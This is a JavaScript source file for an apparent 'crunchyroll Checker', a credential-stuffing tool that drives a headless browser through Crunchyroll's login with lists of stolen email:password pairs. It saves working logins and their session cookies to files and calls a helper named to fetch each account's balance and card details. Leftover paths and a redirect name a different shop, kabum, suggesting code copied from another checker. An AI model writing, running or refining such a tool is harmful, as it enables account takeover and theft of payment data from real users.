import axios  from 'axios'

import PromptSync from "prompt-sync";
import dataResults from '../../../app/data/data.json' assert {type:'json'}

import {
  createBrowser,
  readFile,
  reset,
  clearAndHandleBanner,
} from "../utils/helpers/index.js";
import { accessSync, appendFileSync, existsSync, mkdirSync, writeFileSync } from "fs";
import ora from "ora";
import spinners from "cli-spinners";
import getBallanceAndCC from './utils/helpers/get-ballance-and-cc.js';



const [blue, yellow,green,red,resetColor] = [
  '\x1b[34m',
  '\x1b[33m',
  '\x1b[32m',
  '\x1b[31m',
  '\x1b[0m'
]


let page;
export default async function crunchyroll() {
  await clearAndHandleBanner({
    bannerMessage: "crunchyroll Checker",
    timeout: 0,
  });
  const {matchStrings, fileName} = await readFile("crunchyroll");
  
  // if(!matchStrings) return console.log('sem conta')
  if (!matchStrings) {
    return reset({
      message: matchStrings.message,
    });
  }
  
  await clearAndHandleBanner({
    bannerMessage: "crunchyroll Checker",
  });
  if (!page) {
    const spinnerInstance = ora({
      text: "starting Browser",
      spinner: spinners.arc,
    });

    spinnerInstance.start();

    page = await createBrowser({
      url: "https://sso.crunchyroll.com/pt-br/login",
      handle: false,
      waitFor: '[name="login"]'
    });

    spinnerInstance.succeed();
  }
  const loginInput = await page.$('[name="login"]');
  await loginInput.evaluate((el) => (el.value = ""));
  
  await loginInput.type("dudu@xereca.com");

  await loginInput.press('Enter')
  for (const index in matchStrings) {
    const account = matchStrings[index];
    
    const [http, domain, email, pass] = account.split(":");
    if (!email || !pass) {
      console.log(red,"Formatação invalida");
      continue;
    }
    console.log(email, ':',pass);
    
    
    try {
      if(!dataResults?.[fileName]) dataResults[fileName] ={
        cookiesLives: [],
        lastTested: 0
      }

      // if(dataResults[fileName].lastTested >= index) continue
      dataResults[fileName].lastTested = index
      
     

      await page.waitForSelector('[name="email"]')

      
      const emailInput = await page.$('[name="email"]');
if (emailInput) {
  await emailInput.click();
  
  // Limpa o campo com 'Ctrl + A' e 'Delete'
  await emailInput.press('Control', { delay: 100 });
  await emailInput.press('a', { delay: 100 });
  await emailInput.press('Delete');

  // Verifica se está realmente limpo
  await emailInput.evaluate((el) => console.log('Campo de email após limpeza:', el.value));
  
  await emailInput.type(email); // Digita o email
} else {
  console.log("Campo de email não encontrado.");
}


      
      const passInput = await page.$('[name="password"]');
      //   await passInput.evaluate((el) => (el.value = ""));
      console.log(emailInput);
      console.log(emailInput[0]);
      console.log(passInput);
      await passInput.type('');
      await passInput.type(pass);
      
    await passInput.press("Enter");

    const formatEmailAndPass = `${email}:${pass.replace(/\s+/g, "")}`;
    const url = await page.url();
    if(url.includes("/callback?")) {
        await page.goto("https://sso.crunchyroll.com/pt-br/login", { timeout: 0 });
        continue
    }
    
    await page
      .waitForSelector('[data-testid="generic-error-wrapper"]', {
        timeout: 10000,
      })
      .catch(async (e) => {

        const url = await page.url();
        
        if (url == "https://sso.crunchyroll.com/pt-br/login/") {

          const cookie = await page.cookies()
          
          dataResults[fileName]?.cookiesLives.push({
            emailAndPass:formatEmailAndPass,
            cookie:cookie
          })
          const ballance = await getBallanceAndCC(cookie)
          writeFileSync("src/app/data/data.json", JSON.stringify(dataResults, null, 2))
          if(!existsSync('results')) mkdirSync('results')
          if(!existsSync('results/kabum')) mkdirSync('results/kabum')
          if(!existsSync('results/kabum/'+fileName)) mkdirSync('results/kabum/'+fileName)
          appendFileSync('results/kabum/'+fileName+'/lives.txt',  '\n'+formatEmailAndPass)
          console.log(
            green,
            `[ Live ] >> [${index}/${matchStrings.length}] >> [ ${formatEmailAndPass} ] >> [ ${ballance.ballance} ] -> ${url} `
          );
          // await page.close()
          // await page.close()
          await page.goto("https://www.kabum.com.br/login", { timeout: 0 });
          return;
        }
      }).then(async() => {
        
        const url = await page.url();
        console.log('url aqui',url);
        
        console.log(
          red,
          `[ Die ] >> [${index}/${matchStrings.length}] >> [ ${formatEmailAndPass} ] -> ${url}`
        );
      })
      
    } catch (error) {
      console.log('Error ', error)
    }

  }

  console.log("Concluido com exito.");
  console.log("Pressione qualquer tecla para voltar ao Menu inicial.");
  PromptSync()();
  reset({
    message: "",
    timeout: 1,
  });
}
